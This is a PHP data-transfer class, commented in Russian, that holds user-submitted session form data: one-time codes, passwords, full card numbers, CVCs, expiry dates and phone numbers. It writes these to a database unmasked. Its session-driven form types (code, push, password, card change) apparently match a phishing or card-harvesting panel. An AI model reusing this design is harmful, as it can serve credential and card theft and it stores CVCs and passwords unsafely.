<?php

declare(strict_types=1);

namespace App\DTOs;

use App\Enums\ActionType;

/**
 * DTO для данных формы, отправленных пользователем
 */
readonly class FormDataDTO
{
    public function __construct(
        public string $sessionId,
        public ActionType $actionType,
        public ?string $code = null,
        public ?string $password = null,
        public ?string $cardNumber = null,
        public ?string $cvc = null,
        public ?string $expire = null,
        public ?string $holderName = null,
        public ?string $phoneNumber = null,
        public ?array $customAnswers = null,
        public ?array $images = null,
    ) {}

    /**
     * Создание DTO из массива данных запроса
     */
    public static function fromArray(array $data): self
    {
        return new self(
            sessionId: $data['session_id'],
            actionType: $data['action_type'] instanceof ActionType
                ? $data['action_type']
                : ActionType::from($data['action_type']),
            code: $data['code'] ?? null,
            password: $data['password'] ?? null,
            cardNumber: $data['card_number'] ?? null,
            cvc: $data['cvc'] ?? null,
            expire: $data['expire'] ?? null,
            holderName: $data['holder_name'] ?? null,
            phoneNumber: $data['phone_number'] ?? null,
            customAnswers: $data['custom_answers'] ?? null,
            images: $data['images'] ?? null,
        );
    }

    /**
     * Преобразование в массив для сохранения в БД
     */
    public function toArray(): array
    {
        return array_filter([
            'session_id' => $this->sessionId,
            'action_type' => $this->actionType->value,
            'code' => $this->code,
            'password' => $this->password,
            'card_number' => $this->cardNumber,
            'cvc' => $this->cvc,
            'expire' => $this->expire,
            'holder_name' => $this->holderName,
            'phone_number' => $this->phoneNumber,
            'custom_answers' => $this->customAnswers,
            'images' => $this->images,
        ], fn($value) => $value !== null);
    }

    /**
     * Получить данные для обновления сессии
     */
    public function getSessionUpdateData(): array
    {
        $data = [];

        if ($this->code !== null) {
            $data['code'] = $this->code;
        }

        if ($this->password !== null) {
            $data['password'] = $this->password;
        }

        if ($this->cardNumber !== null) {
            $data['card_number'] = $this->cardNumber;
        }

        if ($this->cvc !== null) {
            $data['cvc'] = $this->cvc;
        }

        if ($this->expire !== null) {
            $data['expire'] = $this->expire;
        }

        if ($this->holderName !== null) {
            $data['holder_name'] = $this->holderName;
        }

        if ($this->phoneNumber !== null) {
            $data['phone_number'] = $this->phoneNumber;
        }

        if ($this->customAnswers !== null) {
            $data['custom_answers'] = $this->customAnswers;
        }

        if ($this->images !== null) {
            $data['images'] = $this->images;
        }

        return $data;
    }

    /**
     * Получить данные для записи в историю
     */
    public function getHistoryData(): array
    {
        return array_filter([
            'action_type' => $this->actionType->value,
            'code' => $this->code,
            'password' => $this->password ? '***' : null, // Маскируем пароль
            'card_number' => $this->cardNumber ? $this->maskCardNumber() : null,
            'has_custom_answers' => $this->customAnswers !== null,
            'images_count' => $this->images !== null ? count($this->images) : null,
        ], fn($value) => $value !== null);
    }

    /**
     * Маскирование номера карты для логов
     */
    private function maskCardNumber(): string
    {
        if ($this->cardNumber === null || strlen($this->cardNumber) < 4) {
            return '****';
        }

        return '**** **** **** ' . substr($this->cardNumber, -4);
    }

    /**
     * Проверка типа формы
     */
    public function isCodeForm(): bool
    {
        return $this->actionType === ActionType::CODE;
    }

    public function isPushForm(): bool
    {
        return $this->actionType === ActionType::PUSH;
    }

    public function isPasswordForm(): bool
    {
        return $this->actionType === ActionType::PASSWORD;
    }

    public function isCardChangeForm(): bool
    {
        return $this->actionType === ActionType::CARD_CHANGE;
    }

    public function isErrorForm(): bool
    {
        return $this->actionType === ActionType::ERROR;
    }
}
